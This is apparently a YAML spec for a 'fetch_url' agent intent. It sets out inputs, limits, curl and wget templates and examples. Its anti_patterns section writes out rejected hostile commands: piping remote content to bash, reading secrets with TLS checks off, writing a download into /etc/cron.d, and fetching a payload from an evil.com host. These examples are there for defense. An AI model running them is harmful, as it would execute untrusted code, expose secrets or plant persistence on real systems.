spec:
  intent: fetch_url
  description: Retrieve content from a URL via HTTP/HTTPS, optionally writing to a file.

  signature:
    inputs:
      - name: url
        type: URL
        constraint: "scheme must be http or https"
      - name: output
        type: FilePath
        optional: true
        description: "Write response body to this path. If omitted, content is returned to caller."
      - name: headers
        type: map<string,string>
        optional: true
        description: "Request headers. Cedar policy may restrict header names or values."
      - name: method
        type: enum<GET, HEAD>
        default: GET
        description: "fetch_url handles read-only methods. State-changing methods use a separate intent."
      - name: timeout
        type: Duration
        default: 30s
        constraint: "must be <= 300s"
      - name: follow_redirects
        type: bool
        default: true
    output:
      type: union<Bytes, FileWritten>

  behavior: |
    Issue a single HTTP(S) request to url and return the response body, or write
    it to output if specified. Fails fast on 4xx/5xx without retry. Response body
    is treated as opaque bytes; never piped to another tool or executed.

  constraints:
    - "Single request per invocation; multi-step flows belong in higher-level intents"
    - "No automatic credential injection from environment"
    - "Max response size: 100MB unless raised by explicit policy"
    - "TLS verification cannot be disabled through this intent"

  capability:
    network:
      - direction: outbound
        host: "{url.host}"
        port: "{url.port}"
        protocol: "{url.scheme}"
    filesystem:
      - operation: write
        path: "{output}"
        required_if: "output is not null"

  implementation:
    - tool: curl
      preferred: true
      requires: "curl >= 7.50"
      template: |
        curl --fail --silent --show-error
             --location={follow_redirects}
             --max-time {timeout.seconds}
             {header_flags} {method_flag} {output_flag}
             {url}
    - tool: wget
      requires: "wget >= 1.20"
      limitations:
        - "Per-header control requires temp file; less ergonomic"
      template: |
        wget --quiet --timeout={timeout.seconds} {output_flag} {url}

  examples:
    - description: "Fetch JSON from a public API"
      intent:
        url: "https://api.github.com/repos/playgroundlogic/walkabl"
      expected_command: |
        curl --fail --silent --show-error --location=true
             --max-time 30
             https://api.github.com/repos/playgroundlogic/walkabl

    - description: "Download a release artifact to a file with extended timeout"
      intent:
        url: "https://releases.example.com/tool-v1.0.tar.gz"
        output: "/tmp/tool.tar.gz"
        timeout: 120s
      expected_command: |
        curl --fail --silent --show-error --location=true
             --max-time 120
             --output /tmp/tool.tar.gz
             https://releases.example.com/tool-v1.0.tar.gz

    - description: "Authenticated API call with content negotiation"
      intent:
        url: "https://api.example.com/v1/resources"
        headers:
          Authorization: "Bearer ${API_TOKEN}"
          Accept: "application/json"
      expected_command: |
        curl --fail --silent --show-error --location=true
             --max-time 30
             --header 'Authorization: Bearer ${API_TOKEN}'
             --header 'Accept: application/json'
             https://api.example.com/v1/resources

    - description: "HEAD request to check resource existence"
      intent:
        url: "https://example.com/large-file.bin"
        method: HEAD
      expected_command: |
        curl --fail --silent --show-error --location=true
             --max-time 30 --head
             https://example.com/large-file.bin

  anti_patterns:
    - bad: 'curl "${URL}" | bash'
      reason: "Pipes arbitrary remote content to shell execution."
      rejection: "Out of scope for fetch_url. Pipe-to-shell requires a separate execute_remote_script intent with explicit policy authorization."

    - bad: 'curl --insecure https://internal/secrets'
      reason: "Bypasses TLS verification, enabling MITM attacks."
      rejection: "fetch_url cannot disable TLS. If TLS bypass is genuinely required, a separate fetch_url_insecure intent exists with default-deny policy."

    - bad: 'curl https://example.com -o /etc/cron.d/job'
      reason: "Writes downloaded content to a privileged execution path."
      rejection: "Output path must satisfy filesystem write policy. System and execution paths require explicit per-path permission."

    - bad: 'curl "https://${USER_INPUT}.evil.com/payload"'
      reason: "URL components built from agent-controlled strings can reach unauthorized hosts."
      rejection: "URL must be fully resolved at intent construction. Host extracted before policy check; dynamic host composition rejected."
